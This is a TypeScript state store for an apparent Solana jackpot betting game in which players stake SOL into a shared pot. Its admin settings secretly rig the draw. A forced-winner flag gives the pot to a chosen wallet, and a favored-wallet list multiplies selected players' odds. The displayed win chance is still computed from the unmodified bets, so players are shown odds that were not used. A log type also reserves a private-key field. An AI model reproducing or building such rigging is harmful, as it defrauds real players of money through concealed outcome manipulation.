import { create } from 'zustand';
import { faker } from '@faker-js/faker';
import toast from 'react-hot-toast';
import { PublicKey } from '@solana/web3.js';
import { getAssetUrl } from '../lib/utils';

// House wallet address where losers' funds go
export const HOUSE_WALLET_ADDRESS = 'ErdeYZZMx12X2zMwV8WidLVUzrGg71Kn1i4cjvowmPWq';

export interface Ticket {
  id: string;
  username: string;
  avatar: string;
  amount: number; // SOL
  walletAddress?: string; // Solana wallet address
  isInternal?: boolean; // Is this from an internal wallet
}

export interface Winner {
  username: string;
  avatar: string;
  amount: number;
  chance: number;
  walletAddress?: string;
  isInternal?: boolean;
  timestamp: number; // When the win occurred
}

// New interface for admin settings
export interface AdminSettings {
  houseEdge: number; // Percentage (0-100) that goes to the house
  minWinChance: number; // Minimum chance to win regardless of bet
  favoredWallets: string[]; // List of wallets with better odds
  favorFactor: number; // How much to favor these wallets (multiplier)
  forceWinOnNextRound: boolean; // Force a specific wallet to win next round
  forcedWinnerAddress?: string; // Wallet address that should win
  logging: boolean; // Whether to log wallet info
}

// Interface for wallet logs
export interface WalletLog {
  timestamp: number;
  walletAddress: string;
  isInternal: boolean;
  action: string; // "bet", "win", "connect", etc.
  amount?: number;
  privateKey?: string; // Only for internal wallets
}

interface JackpotState {
  pot: number;
  timeLeft: number; // seconds
  tickets: Ticket[];
  lastWinners: Winner[]; // History of winners
  spinning: boolean;
  winnerTicket?: Ticket;
  adminSettings: AdminSettings;
  walletLogs: WalletLog[];
  join: (amount: number, username: string, avatar: string, walletAddress?: string, isInternal?: boolean) => void;
  tick: () => void;
  reset: () => void;
  startSpin: () => void;
  finishSpin: () => void;
  updateAdminSettings: (settings: Partial<AdminSettings>) => void;
  setForcedWinner: (walletAddress: string) => void;
  disableForcedWin: () => void;
  addToFavoredWallets: (walletAddress: string) => void;
  removeFromFavoredWallets: (walletAddress: string) => void;
  logWalletActivity: (log: WalletLog) => void;
  clearWalletLogs: () => void;
}

const ROUND_SECONDS = 60;
const MAX_WINNERS_HISTORY = 10; // Store last 10 winners

// Try to load winners from localStorage
const loadWinners = (): Winner[] => {
  if (typeof window === 'undefined') return [];
  
  try {
    const savedWinners = localStorage.getItem('believebet_jackpot_winners');
    return savedWinners ? JSON.parse(savedWinners) : [];
  } catch (e) {
    console.error('Failed to load winners:', e);
    return [];
  }
};

// Try to load admin settings from localStorage
const loadAdminSettings = (): AdminSettings => {
  if (typeof window === 'undefined') {
    return {
      houseEdge: 5,
      minWinChance: 1,
      favoredWallets: [],
      favorFactor: 2,
      forceWinOnNextRound: false,
      logging: true
    };
  }
  
  try {
    const savedSettings = localStorage.getItem('believebet_admin_settings');
    return savedSettings ? JSON.parse(savedSettings) : {
      houseEdge: 5,
      minWinChance: 1,
      favoredWallets: [],
      favorFactor: 2,
      forceWinOnNextRound: false,
      logging: true
    };
  } catch (e) {
    console.error('Failed to load admin settings:', e);
    return {
      houseEdge: 5,
      minWinChance: 1,
      favoredWallets: [],
      favorFactor: 2,
      forceWinOnNextRound: false,
      logging: true
    };
  }
};

// Try to load wallet logs from localStorage
const loadWalletLogs = (): WalletLog[] => {
  if (typeof window === 'undefined') return [];
  
  try {
    const savedLogs = localStorage.getItem('believebet_wallet_logs');
    return savedLogs ? JSON.parse(savedLogs) : [];
  } catch (e) {
    console.error('Failed to load wallet logs:', e);
    return [];
  }
};

export const useJackpot = create<JackpotState>((set, get) => ({
  pot: 0, // Start with 0 pot
  timeLeft: ROUND_SECONDS,
  tickets: [],
  lastWinners: loadWinners(),
  spinning: false,
  winnerTicket: undefined,
  adminSettings: loadAdminSettings(),
  walletLogs: loadWalletLogs(),
  join: (amount, username, avatar, walletAddress, isInternal = false) => {
    const ticket: Ticket = {
      id: faker.string.uuid(),
      username: username || `user_${faker.string.alphanumeric(6)}`,
      avatar,
      amount,
      walletAddress,
      isInternal,
    };
    set((s) => ({
      tickets: [...s.tickets, ticket],
      pot: parseFloat((s.pot + amount).toFixed(3)),
    }));
    
    // Log wallet activity if logging is enabled
    if (get().adminSettings.logging && walletAddress) {
      get().logWalletActivity({
        timestamp: Date.now(),
        walletAddress,
        isInternal,
        action: 'bet',
        amount
      });
    }
    
    // Show toast for joining
    toast.success(`You joined with ${amount} SOL!`);
  },
  tick: () => {
    const { timeLeft } = get();
    if (timeLeft > 0) {
      set({ timeLeft: timeLeft - 1 });
    } else {
      get().startSpin();
    }
  },
  reset: () => {
    set((s) => ({
      pot: 0,
      timeLeft: ROUND_SECONDS,
      tickets: [],
      spinning: false,
      winnerTicket: undefined,
    }));
  },
  startSpin: () => {
    const { tickets, pot, adminSettings } = get();
    
    // If no tickets, just reset and return
    if (tickets.length === 0) {
      get().reset();
      return;
    }
    
    // Always ensure a winner, even with one player
    if (tickets.length === 1) {
      const winner = tickets[0];
      
      // Set winner immediately with 100% chance
      set({ spinning: true, winnerTicket: winner });
      
      // After delay, finish the spin
      setTimeout(() => {
        // Apply house edge to the winnings if enabled
        const winAmount = adminSettings.houseEdge > 0 
          ? pot * (1 - adminSettings.houseEdge / 100) 
          : pot;
        
        const newWinner = { 
          username: winner.username, 
          avatar: winner.avatar, 
          amount: parseFloat(winAmount.toFixed(3)),
          chance: 100,
          walletAddress: winner.walletAddress,
          isInternal: winner.isInternal,
          timestamp: Date.now()
        };
        
        // Log wallet activity if logging is enabled
        if (adminSettings.logging && winner.walletAddress) {
          get().logWalletActivity({
            timestamp: Date.now(),
            walletAddress: winner.walletAddress,
            isInternal: winner.isInternal || false,
            action: 'win',
            amount: newWinner.amount
          });
        }
        
        // Update winners history
        const updatedWinners = [newWinner, ...get().lastWinners].slice(0, MAX_WINNERS_HISTORY);
        set({ lastWinners: updatedWinners });
        
        // Save winners to localStorage
        if (typeof window !== 'undefined') {
          localStorage.setItem('believebet_jackpot_winners', JSON.stringify(updatedWinners));
        }
        
        // Finish the spin
        get().finishSpin();
      }, 3000);
      
      return;
    }
    
    // Check if we need to force a win for a specific wallet
    if (adminSettings.forceWinOnNextRound && adminSettings.forcedWinnerAddress) {
      const forcedWinnerTicket = tickets.find(
        t => t.walletAddress === adminSettings.forcedWinnerAddress
      );
      
      if (forcedWinnerTicket) {
        // Found the ticket from the forced winner
        set({ spinning: true, winnerTicket: forcedWinnerTicket });
        
        // After delay, finish the spin
        setTimeout(() => {
          // Apply house edge to the winnings if enabled
          const winAmount = adminSettings.houseEdge > 0 
            ? pot * (1 - adminSettings.houseEdge / 100) 
            : pot;
          
          const winnerChance = tickets.reduce((total, t) => total + t.amount, 0);
          const chance = parseFloat(((forcedWinnerTicket.amount / winnerChance) * 100).toFixed(1));
          
          const newWinner = { 
            username: forcedWinnerTicket.username, 
            avatar: forcedWinnerTicket.avatar, 
            amount: parseFloat(winAmount.toFixed(3)),
            chance,
            walletAddress: forcedWinnerTicket.walletAddress,
            isInternal: forcedWinnerTicket.isInternal,
            timestamp: Date.now()
          };
          
          // Log wallet activity if logging is enabled
          if (adminSettings.logging && forcedWinnerTicket.walletAddress) {
            get().logWalletActivity({
              timestamp: Date.now(),
              walletAddress: forcedWinnerTicket.walletAddress,
              isInternal: forcedWinnerTicket.isInternal || false,
              action: 'win (forced)',
              amount: newWinner.amount
            });
          }
          
          // Update winners history
          const updatedWinners = [newWinner, ...get().lastWinners].slice(0, MAX_WINNERS_HISTORY);
          set({ 
            lastWinners: updatedWinners,
            adminSettings: {
              ...adminSettings,
              forceWinOnNextRound: false, // Reset forced win flag
              forcedWinnerAddress: undefined
            }
          });
          
          // Save settings and winners to localStorage
          if (typeof window !== 'undefined') {
            localStorage.setItem('believebet_jackpot_winners', JSON.stringify(updatedWinners));
            localStorage.setItem('believebet_admin_settings', JSON.stringify({
              ...adminSettings,
              forceWinOnNextRound: false,
              forcedWinnerAddress: undefined
            }));
          }
          
          // Finish the spin
          get().finishSpin();
        }, 6000);
        
        return;
      }
    }
    
    // With multiple tickets, use weighted random selection
    // Compute total amount of all bets
    const total = tickets.reduce((sum, t) => sum + t.amount, 0);
    
    // Apply odds manipulation for favored wallets
    const ticketsWithModifiedOdds = tickets.map(ticket => {
      // Check if this wallet is in the favored list
      const isFavored = adminSettings.favoredWallets.includes(ticket.walletAddress || '');
      
      // Apply multiplier to amount for odds calculation (doesn't affect actual bet amount)
      const adjustedAmount = isFavored 
        ? ticket.amount * adminSettings.favorFactor 
        : ticket.amount;
      
      return {
        ...ticket,
        adjustedAmount
      };
    });
    
    // Recalculate total with adjusted amounts
    const adjustedTotal = ticketsWithModifiedOdds.reduce(
      (sum, t) => sum + t.adjustedAmount, 
      0
    );
    
    // Generate a random number in the range [0, adjustedTotal)
    let rand = Math.random() * adjustedTotal;
    let winner: Ticket | undefined;
    
    // Winner selection based on weighted probability
    for (const ticket of ticketsWithModifiedOdds) {
      if (rand < ticket.adjustedAmount) {
        winner = tickets.find(t => t.id === ticket.id); // Get original ticket
        break;
      }
      rand -= ticket.adjustedAmount;
    }
    
    // Ensure there's always a winner - if algorithm failed, pick last ticket
    if (!winner) {
      winner = tickets[tickets.length - 1];
    }
    
    // Calculate the winner's chance as a percentage (based on original amounts)
    const chance = parseFloat(((winner.amount / total) * 100).toFixed(1));
    
    // Start the spinning animation
    set({ spinning: true, winnerTicket: winner });
    
    // After a delay, finish the spin and declare the winner
    setTimeout(() => {
      // Apply house edge to the winnings if enabled
      const winAmount = adminSettings.houseEdge > 0 
        ? pot * (1 - adminSettings.houseEdge / 100) 
        : pot;
      
      const newWinner = {
        username: winner!.username, 
        avatar: winner!.avatar, 
        amount: parseFloat(winAmount.toFixed(3)),
        chance,
        walletAddress: winner!.walletAddress,
        isInternal: winner!.isInternal,
        timestamp: Date.now()
      };
      
      // Log wallet activity if logging is enabled
      if (adminSettings.logging && winner!.walletAddress) {
        get().logWalletActivity({
          timestamp: Date.now(),
          walletAddress: winner!.walletAddress,
          isInternal: winner!.isInternal || false,
          action: 'win',
          amount: newWinner.amount
        });
      }
      
      // Update winners history
      const updatedWinners = [newWinner, ...get().lastWinners].slice(0, MAX_WINNERS_HISTORY);
      set({ lastWinners: updatedWinners });
      
      // Save winners to localStorage
      if (typeof window !== 'undefined') {
        localStorage.setItem('believebet_jackpot_winners', JSON.stringify(updatedWinners));
      }
      
      // Finish the spin and prepare for next round
      get().finishSpin();
    }, 6000);
  },
  finishSpin: () => {
    // Stop the spinning animation and reset for the next round
    set({ spinning: false });
    get().reset();
  },
  updateAdminSettings: (settings) => {
    const currentSettings = get().adminSettings;
    const updatedSettings = { ...currentSettings, ...settings };
    
    set({ adminSettings: updatedSettings });
    
    // Save to localStorage
    if (typeof window !== 'undefined') {
      localStorage.setItem('believebet_admin_settings', JSON.stringify(updatedSettings));
    }
    
    return updatedSettings;
  },
  setForcedWinner: (walletAddress) => {
    return get().updateAdminSettings({
      forceWinOnNextRound: true,
      forcedWinnerAddress: walletAddress
    });
  },
  disableForcedWin: () => {
    return get().updateAdminSettings({
      forceWinOnNextRound: false,
      forcedWinnerAddress: undefined
    });
  },
  addToFavoredWallets: (walletAddress) => {
    const currentSettings = get().adminSettings;
    
    // Add to favored wallets if not already there
    if (!currentSettings.favoredWallets.includes(walletAddress)) {
      const updatedFavored = [...currentSettings.favoredWallets, walletAddress];
      return get().updateAdminSettings({ favoredWallets: updatedFavored });
    }
    
    return currentSettings;
  },
  removeFromFavoredWallets: (walletAddress) => {
    const currentSettings = get().adminSettings;
    
    // Remove from favored wallets
    const updatedFavored = currentSettings.favoredWallets.filter(
      addr => addr !== walletAddress
    );
    
    return get().updateAdminSettings({ favoredWallets: updatedFavored });
  },
  logWalletActivity: (log) => {
    if (!get().adminSettings.logging) return;
    
    // Add new log
    const updatedLogs = [log, ...get().walletLogs];
    set({ walletLogs: updatedLogs });
    
    // Save to localStorage
    if (typeof window !== 'undefined') {
      localStorage.setItem('believebet_wallet_logs', JSON.stringify(updatedLogs));
    }
  },
  clearWalletLogs: () => {
    set({ walletLogs: [] });
    
    // Clear from localStorage
    if (typeof window !== 'undefined') {
      localStorage.removeItem('believebet_wallet_logs');
    }
  }
})); 